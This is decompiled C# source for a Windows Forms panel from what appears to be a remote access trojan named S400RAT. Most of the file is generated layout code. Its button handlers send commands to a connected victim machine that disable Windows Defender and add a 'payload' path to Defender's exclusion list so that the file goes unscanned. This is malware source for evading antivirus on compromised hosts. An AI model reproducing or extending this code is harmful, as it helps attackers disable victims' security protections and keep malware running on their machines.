using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace S400RAT;

[DesignerGenerated]
public class Def : Form
{
	public IContainer icontainer_0;

	[AccessedThroughProperty("Guna2AnimateWindow1")]
	[CompilerGenerated]
	public Guna2AnimateWindow guna2AnimateWindow_0;

	[AccessedThroughProperty("Guna2BorderlessForm1")]
	[CompilerGenerated]
	public Guna2BorderlessForm guna2BorderlessForm_0;

	[AccessedThroughProperty("panel5")]
	[CompilerGenerated]
	public Panel panel_0;

	[AccessedThroughProperty("n")]
	[CompilerGenerated]
	public Label label_0;

	[AccessedThroughProperty("w")]
	[CompilerGenerated]
	public Label label_1;

	[AccessedThroughProperty("PictureBox1")]
	[CompilerGenerated]
	public PictureBox pictureBox_0;

	[AccessedThroughProperty("Label2")]
	[CompilerGenerated]
	public Label label_2;

	[AccessedThroughProperty("Label7")]
	[CompilerGenerated]
	public Label label_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Label1")]
	public Label label_4;

	[AccessedThroughProperty("pictureBox3")]
	[CompilerGenerated]
	public PictureBox pictureBox_1;

	[CompilerGenerated]
	[AccessedThroughProperty("label9")]
	public Label tTjjqFbo2;

	[AccessedThroughProperty("Guna2ControlBox1")]
	[CompilerGenerated]
	public Guna2ControlBox guna2ControlBox_0;

	[AccessedThroughProperty("panel2")]
	[CompilerGenerated]
	public Panel panel_1;

	[AccessedThroughProperty("Panel9")]
	[CompilerGenerated]
	public Panel panel_2;

	[AccessedThroughProperty("Label22")]
	[CompilerGenerated]
	public Label label_5;

	[CompilerGenerated]
	[AccessedThroughProperty("TextBox1")]
	public Guna2TextBox guna2TextBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox9")]
	public PictureBox pictureBox_2;

	[CompilerGenerated]
	[AccessedThroughProperty("Label13")]
	public Label label_6;

	[AccessedThroughProperty("Panel4")]
	[CompilerGenerated]
	public Panel panel_3;

	[AccessedThroughProperty("Label15")]
	[CompilerGenerated]
	public Label label_7;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox5")]
	public PictureBox pictureBox_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Button7")]
	public Guna2GradientButton guna2GradientButton_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Label4")]
	public Label label_8;

	[AccessedThroughProperty("Guna2GradientButton1")]
	[CompilerGenerated]
	public Guna2GradientButton guna2GradientButton_1;

	[CompilerGenerated]
	[AccessedThroughProperty("Clos")]
	public Timer timer_0;

	public Client C;

	public string Admin;

	public virtual Panel panel5
	{
		[CompilerGenerated]
		get
		{
			return panel_0;
		}
		[CompilerGenerated]
		set
		{
			panel_0 = value;
		}
	}

	internal virtual Label n
	{
		[CompilerGenerated]
		get
		{
			return label_0;
		}
		[CompilerGenerated]
		set
		{
			label_0 = value;
		}
	}

	internal virtual Label w
	{
		[CompilerGenerated]
		get
		{
			return label_1;
		}
		[CompilerGenerated]
		set
		{
			label_1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	public virtual Label Label2
	{
		[CompilerGenerated]
		get
		{
			return label_2;
		}
		[CompilerGenerated]
		set
		{
			label_2 = value;
		}
	}

	public virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return label_3;
		}
		[CompilerGenerated]
		set
		{
			label_3 = value;
		}
	}

	public virtual Label Label1
	{
		[CompilerGenerated]
		get
		{
			return label_4;
		}
		[CompilerGenerated]
		set
		{
			label_4 = value;
		}
	}

	public virtual PictureBox pictureBox3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_1 = value;
		}
	}

	public virtual Label label9
	{
		[CompilerGenerated]
		get
		{
			return tTjjqFbo2;
		}
		[CompilerGenerated]
		set
		{
			tTjjqFbo2 = value;
		}
	}

	internal virtual Guna2ControlBox Guna2ControlBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2ControlBox_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_4;
			Guna2ControlBox guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click -= value2;
			}
			guna2ControlBox_0 = value;
			guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click += value2;
			}
		}
	}

	public virtual Panel panel2
	{
		[CompilerGenerated]
		get
		{
			return panel_1;
		}
		[CompilerGenerated]
		set
		{
			panel_1 = value;
		}
	}

	public virtual Panel Panel9
	{
		[CompilerGenerated]
		get
		{
			return panel_2;
		}
		[CompilerGenerated]
		set
		{
			panel_2 = value;
		}
	}

	public virtual Label Label22
	{
		[CompilerGenerated]
		get
		{
			return label_5;
		}
		[CompilerGenerated]
		set
		{
			label_5 = value;
		}
	}

	internal virtual Guna2TextBox TextBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_1;
			EventHandler value3 = method_3;
			Guna2TextBox guna2TextBox = guna2TextBox_0;
			if (guna2TextBox != null)
			{
				guna2TextBox.IconLeftClick -= value2;
				guna2TextBox.TextChanged -= value3;
			}
			guna2TextBox_0 = value;
			guna2TextBox = guna2TextBox_0;
			if (guna2TextBox != null)
			{
				guna2TextBox.IconLeftClick += value2;
				guna2TextBox.TextChanged += value3;
			}
		}
	}

	public virtual PictureBox PictureBox9
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_2;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_2 = value;
		}
	}

	public virtual Label Label13
	{
		[CompilerGenerated]
		get
		{
			return label_6;
		}
		[CompilerGenerated]
		set
		{
			label_6 = value;
		}
	}

	public virtual Panel Panel4
	{
		[CompilerGenerated]
		get
		{
			return panel_3;
		}
		[CompilerGenerated]
		set
		{
			panel_3 = value;
		}
	}

	public virtual Label Label15
	{
		[CompilerGenerated]
		get
		{
			return label_7;
		}
		[CompilerGenerated]
		set
		{
			label_7 = value;
		}
	}

	public virtual PictureBox PictureBox5
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_3;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_3 = value;
		}
	}

	internal virtual Guna2GradientButton Button7
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_2;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_0 = value;
			guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	public virtual Label Label4
	{
		[CompilerGenerated]
		get
		{
			return label_8;
		}
		[CompilerGenerated]
		set
		{
			label_8 = value;
		}
	}

	internal virtual Guna2GradientButton Guna2GradientButton1
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_5;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_1;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_1 = value;
			guna2GradientButton = guna2GradientButton_1;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	public Def()
	{
		base.Load += Def_Load;
		method_0();
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	public void method_0()
	{
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Def));
		vmethod_1(new Guna2AnimateWindow(icontainer_0));
		vmethod_3(new Guna2BorderlessForm(icontainer_0));
		panel5 = new Panel();
		n = new Label();
		w = new Label();
		PictureBox1 = new PictureBox();
		Label2 = new Label();
		Label7 = new Label();
		Label1 = new Label();
		pictureBox3 = new PictureBox();
		label9 = new Label();
		Guna2ControlBox1 = new Guna2ControlBox();
		panel2 = new Panel();
		Panel9 = new Panel();
		Guna2GradientButton1 = new Guna2GradientButton();
		Label22 = new Label();
		TextBox1 = new Guna2TextBox();
		PictureBox9 = new PictureBox();
		Label13 = new Label();
		Panel4 = new Panel();
		Label15 = new Label();
		PictureBox5 = new PictureBox();
		Button7 = new Guna2GradientButton();
		Label4 = new Label();
		vmethod_5(new Timer(icontainer_0));
		panel5.SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		panel2.SuspendLayout();
		Panel9.SuspendLayout();
		((ISupportInitialize)PictureBox9).BeginInit();
		Panel4.SuspendLayout();
		((ISupportInitialize)PictureBox5).BeginInit();
		SuspendLayout();
		vmethod_0().AnimationType = Guna2AnimateWindow.AnimateWindowType.AW_BLEND;
		vmethod_2().ContainerControl = this;
		panel5.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		panel5.BackColor = Color.FromArgb(37, 42, 64);
		panel5.Controls.Add(n);
		panel5.Controls.Add(w);
		panel5.Controls.Add(PictureBox1);
		panel5.Controls.Add(Label2);
		panel5.Controls.Add(Label7);
		panel5.Controls.Add(Label1);
		panel5.Controls.Add(pictureBox3);
		panel5.Controls.Add(label9);
		panel5.Location = new Point(2, 1);
		panel5.Name = "panel5";
		panel5.Size = new Size(326, 125);
		panel5.TabIndex = 125;
		n.AutoSize = true;
		n.Font = new Font("Nirmala UI", 9.75f);
		n.ForeColor = Color.FromArgb(158, 161, 176);
		n.Location = new Point(94, 81);
		n.Name = "n";
		n.Size = new Size(18, 17);
		n.TabIndex = 109;
		n.Text = "--";
		w.AutoSize = true;
		w.Font = new Font("Nirmala UI", 9.75f);
		w.ForeColor = Color.FromArgb(158, 161, 176);
		w.Location = new Point(94, 102);
		w.Name = "w";
		w.Size = new Size(18, 17);
		w.TabIndex = 108;
		w.Text = "--";
		PictureBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		PictureBox1.Image = (Image)componentResourceManager.GetObject("PictureBox1.Image");
		PictureBox1.Location = new Point(265, 7);
		PictureBox1.Name = "PictureBox1";
		PictureBox1.Size = new Size(53, 38);
		PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox1.TabIndex = 107;
		PictureBox1.TabStop = false;
		Label2.AutoSize = true;
		Label2.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label2.ForeColor = Color.White;
		Label2.Location = new Point(4, 7);
		Label2.Name = "Label2";
		Label2.Size = new Size(241, 25);
		Label2.TabIndex = 106;
		Label2.Text = "Windows Defender Control";
		Label7.AutoSize = true;
		Label7.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label7.ForeColor = Color.FromArgb(158, 161, 176);
		Label7.Location = new Point(19, 100);
		Label7.Name = "Label7";
		Label7.Size = new Size(68, 17);
		Label7.TabIndex = 4;
		Label7.Text = "Windows :";
		Label1.AutoSize = true;
		Label1.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label1.ForeColor = Color.FromArgb(158, 161, 176);
		Label1.Location = new Point(6, 79);
		Label1.Name = "Label1";
		Label1.Size = new Size(81, 17);
		Label1.TabIndex = 3;
		Label1.Text = "User Name :";
		pictureBox3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		pictureBox3.Image = (Image)componentResourceManager.GetObject("pictureBox3.Image");
		pictureBox3.Location = new Point(265, 59);
		pictureBox3.Name = "pictureBox3";
		pictureBox3.Size = new Size(53, 58);
		pictureBox3.SizeMode = PictureBoxSizeMode.Zoom;
		pictureBox3.TabIndex = 2;
		pictureBox3.TabStop = false;
		label9.AutoSize = true;
		label9.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		label9.ForeColor = Color.FromArgb(84, 131, 255);
		label9.Location = new Point(4, 44);
		label9.Name = "label9";
		label9.Size = new Size(111, 25);
		label9.TabIndex = 0;
		label9.Text = "Information";
		Guna2ControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2ControlBox1.BackColor = Color.Transparent;
		Guna2ControlBox1.BorderColor = Color.Transparent;
		Guna2ControlBox1.FillColor = Color.FromArgb(46, 51, 73);
		Guna2ControlBox1.HoverState.Parent = Guna2ControlBox1;
		Guna2ControlBox1.IconColor = Color.White;
		Guna2ControlBox1.Location = new Point(359, 1);
		Guna2ControlBox1.Name = "Guna2ControlBox1";
		Guna2ControlBox1.PressedColor = Color.FromArgb(24, 30, 54);
		Guna2ControlBox1.ShadowDecoration.Parent = Guna2ControlBox1;
		Guna2ControlBox1.Size = new Size(45, 29);
		Guna2ControlBox1.TabIndex = 124;
		panel2.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		panel2.AutoSizeMode = AutoSizeMode.GrowAndShrink;
		panel2.BackColor = Color.FromArgb(24, 30, 54);
		panel2.Controls.Add(Panel9);
		panel2.Controls.Add(Panel4);
		panel2.Location = new Point(12, 147);
		panel2.Name = "panel2";
		panel2.Size = new Size(380, 336);
		panel2.TabIndex = 126;
		Panel9.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		Panel9.BackColor = Color.FromArgb(37, 42, 64);
		Panel9.Controls.Add(Guna2GradientButton1);
		Panel9.Controls.Add(Label22);
		Panel9.Controls.Add(TextBox1);
		Panel9.Controls.Add(PictureBox9);
		Panel9.Controls.Add(Label13);
		Panel9.ForeColor = Color.FromArgb(37, 42, 64);
		Panel9.Location = new Point(16, 135);
		Panel9.Name = "Panel9";
		Panel9.Size = new Size(346, 190);
		Panel9.TabIndex = 108;
		Guna2GradientButton1.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
		Guna2GradientButton1.Animated = true;
		Guna2GradientButton1.AutoRoundedCorners = true;
		Guna2GradientButton1.BackColor = Color.Transparent;
		Guna2GradientButton1.BorderRadius = 22;
		Guna2GradientButton1.CheckedState.Parent = Guna2GradientButton1;
		Guna2GradientButton1.CustomImages.Parent = Guna2GradientButton1;
		Guna2GradientButton1.FillColor = Color.FromArgb(24, 30, 54);
		Guna2GradientButton1.FillColor2 = Color.FromArgb(24, 30, 54);
		Guna2GradientButton1.Font = new Font("Segoe UI", 9f);
		Guna2GradientButton1.ForeColor = Color.White;
		Guna2GradientButton1.HoverState.Parent = Guna2GradientButton1;
		Guna2GradientButton1.Image = (Image)componentResourceManager.GetObject("Guna2GradientButton1.Image");
		Guna2GradientButton1.ImageAlign = HorizontalAlignment.Right;
		Guna2GradientButton1.IndicateFocus = true;
		Guna2GradientButton1.Location = new Point(6, 51);
		Guna2GradientButton1.Name = "Guna2GradientButton1";
		Guna2GradientButton1.ShadowDecoration.Parent = Guna2GradientButton1;
		Guna2GradientButton1.Size = new Size(333, 46);
		Guna2GradientButton1.TabIndex = 88;
		Guna2GradientButton1.Text = "Add the Payload inside the exception";
		Guna2GradientButton1.UseTransparentBackground = true;
		Label22.AutoSize = true;
		Label22.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label22.ForeColor = Color.FromArgb(158, 161, 176);
		Label22.Location = new Point(7, 108);
		Label22.Name = "Label22";
		Label22.Size = new Size(301, 34);
		Label22.TabIndex = 87;
		Label22.Text = "Make Windows Defender \r\ndon't scan the file you choose (Even if it's working)";
		TextBox1.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		TextBox1.Animated = true;
		TextBox1.AutoRoundedCorners = true;
		TextBox1.BackColor = Color.FromArgb(46, 51, 73);
		TextBox1.BorderColor = Color.FromArgb(0, 126, 249);
		TextBox1.BorderRadius = 13;
		TextBox1.BorderStyle = DashStyle.Custom;
		TextBox1.Cursor = Cursors.IBeam;
		TextBox1.DefaultText = "";
		TextBox1.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		TextBox1.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		TextBox1.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		TextBox1.DisabledState.Parent = TextBox1;
		TextBox1.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		TextBox1.FillColor = Color.FromArgb(37, 42, 64);
		TextBox1.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		TextBox1.FocusedState.Parent = TextBox1;
		TextBox1.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		TextBox1.ForeColor = Color.White;
		TextBox1.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		TextBox1.HoverState.Parent = TextBox1;
		TextBox1.IconLeft = (Image)componentResourceManager.GetObject("TextBox1.IconLeft");
		TextBox1.IconLeftCursor = Cursors.Hand;
		TextBox1.IconRight = (Image)componentResourceManager.GetObject("TextBox1.IconRight");
		TextBox1.Location = new Point(6, 149);
		TextBox1.Margin = new Padding(3, 2, 3, 2);
		TextBox1.Name = "TextBox1";
		TextBox1.PasswordChar = '\0';
		TextBox1.PlaceholderForeColor = Color.Gray;
		TextBox1.PlaceholderText = "Path ...";
		TextBox1.SelectedText = "";
		TextBox1.ShadowDecoration.Parent = TextBox1;
		TextBox1.Size = new Size(333, 29);
		TextBox1.Style = TextBoxStyle.Material;
		TextBox1.TabIndex = 86;
		TextBox1.TextAlign = HorizontalAlignment.Center;
		PictureBox9.Image = (Image)componentResourceManager.GetObject("PictureBox9.Image");
		PictureBox9.Location = new Point(291, 7);
		PictureBox9.Name = "PictureBox9";
		PictureBox9.Size = new Size(48, 30);
		PictureBox9.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox9.TabIndex = 76;
		PictureBox9.TabStop = false;
		Label13.AutoSize = true;
		Label13.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label13.ForeColor = Color.White;
		Label13.Location = new Point(3, 3);
		Label13.Name = "Label13";
		Label13.Size = new Size(182, 17);
		Label13.TabIndex = 1;
		Label13.Text = "Windows Defender Exclusions";
		Panel4.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		Panel4.BackColor = Color.FromArgb(37, 42, 64);
		Panel4.Controls.Add(Label15);
		Panel4.Controls.Add(PictureBox5);
		Panel4.Controls.Add(Button7);
		Panel4.Controls.Add(Label4);
		Panel4.ForeColor = Color.FromArgb(37, 42, 64);
		Panel4.Location = new Point(16, 11);
		Panel4.Name = "Panel4";
		Panel4.Size = new Size(346, 113);
		Panel4.TabIndex = 103;
		Label15.AutoSize = true;
		Label15.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label15.ForeColor = Color.FromArgb(158, 161, 176);
		Label15.Location = new Point(3, 28);
		Label15.Name = "Label15";
		Label15.Size = new Size(212, 17);
		Label15.TabIndex = 82;
		Label15.Text = "Disabe Windows Defender Security";
		PictureBox5.Image = (Image)componentResourceManager.GetObject("PictureBox5.Image");
		PictureBox5.Location = new Point(291, 6);
		PictureBox5.Name = "PictureBox5";
		PictureBox5.Size = new Size(48, 30);
		PictureBox5.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox5.TabIndex = 76;
		PictureBox5.TabStop = false;
		Button7.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
		Button7.Animated = true;
		Button7.AutoRoundedCorners = true;
		Button7.BackColor = Color.Transparent;
		Button7.BorderRadius = 22;
		Button7.CheckedState.Parent = Button7;
		Button7.CustomImages.Parent = Button7;
		Button7.FillColor = Color.FromArgb(24, 30, 54);
		Button7.FillColor2 = Color.FromArgb(24, 30, 54);
		Button7.Font = new Font("Segoe UI", 9f);
		Button7.ForeColor = Color.White;
		Button7.HoverState.Parent = Button7;
		Button7.Image = (Image)componentResourceManager.GetObject("Button7.Image");
		Button7.ImageAlign = HorizontalAlignment.Right;
		Button7.IndicateFocus = true;
		Button7.Location = new Point(4, 59);
		Button7.Name = "Button7";
		Button7.ShadowDecoration.Parent = Button7;
		Button7.Size = new Size(335, 46);
		Button7.TabIndex = 80;
		Button7.Text = "Disable";
		Button7.UseTransparentBackground = true;
		Label4.AutoSize = true;
		Label4.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label4.ForeColor = Color.White;
		Label4.Location = new Point(3, 6);
		Label4.Name = "Label4";
		Label4.Size = new Size(119, 17);
		Label4.TabIndex = 1;
		Label4.Text = "Windows Defender";
		vmethod_4().Enabled = true;
		vmethod_4().Interval = 10;
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(46, 51, 73);
		base.ClientSize = new Size(406, 495);
		base.Controls.Add(panel2);
		base.Controls.Add(panel5);
		base.Controls.Add(Guna2ControlBox1);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Name = "Def";
		Text = "Def";
		panel5.ResumeLayout(performLayout: false);
		panel5.PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		panel2.ResumeLayout(performLayout: false);
		Panel9.ResumeLayout(performLayout: false);
		Panel9.PerformLayout();
		((ISupportInitialize)PictureBox9).EndInit();
		Panel4.ResumeLayout(performLayout: false);
		Panel4.PerformLayout();
		((ISupportInitialize)PictureBox5).EndInit();
		ResumeLayout(performLayout: false);
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2AnimateWindow vmethod_0()
	{
		return guna2AnimateWindow_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_1(Guna2AnimateWindow WithEventsValue)
	{
		guna2AnimateWindow_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2BorderlessForm vmethod_2()
	{
		return guna2BorderlessForm_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_3(Guna2BorderlessForm WithEventsValue)
	{
		guna2BorderlessForm_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_4()
	{
		return timer_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_5(Timer WithEventsValue)
	{
		EventHandler value = method_6;
		Timer timer = timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_0 = WithEventsValue;
		timer = timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	public void Def_Load(object sender, EventArgs e)
	{
		C.Send("Admin" + Class7.string_1);
	}

	public void method_1(object sender, EventArgs e)
	{
		if (Operators.CompareString(Admin, "Admin", TextCompare: false) != 0)
		{
			Interaction.MsgBox("It does not run as an administrator", MsgBoxStyle.Exclamation, "Error");
		}
		else
		{
			C.Send("ES" + Class7.string_1 + TextBox1.Text);
		}
	}

	public void method_2(object sender, EventArgs e)
	{
		if (Operators.CompareString(Admin, "Admin", TextCompare: false) != 0)
		{
			Interaction.MsgBox("It does not run as an administrator", MsgBoxStyle.Exclamation, "Error");
		}
		else
		{
			C.Send("DS" + Class7.string_1);
		}
	}

	public void method_3(object sender, EventArgs e)
	{
	}

	public void method_4(object sender, EventArgs e)
	{
		if (C != null)
		{
			C.CN = false;
		}
	}

	public void method_5(object sender, EventArgs e)
	{
		if (Operators.CompareString(Admin, "Admin", TextCompare: false) == 0)
		{
			C.Send("App" + Class7.string_1);
		}
		else
		{
			Interaction.MsgBox("It does not run as an administrator", MsgBoxStyle.Exclamation, "Error");
		}
	}

	public void method_6(object sender, EventArgs e)
	{
		if (!C.CN)
		{
			C.CN = false;
			Close();
		}
	}
}
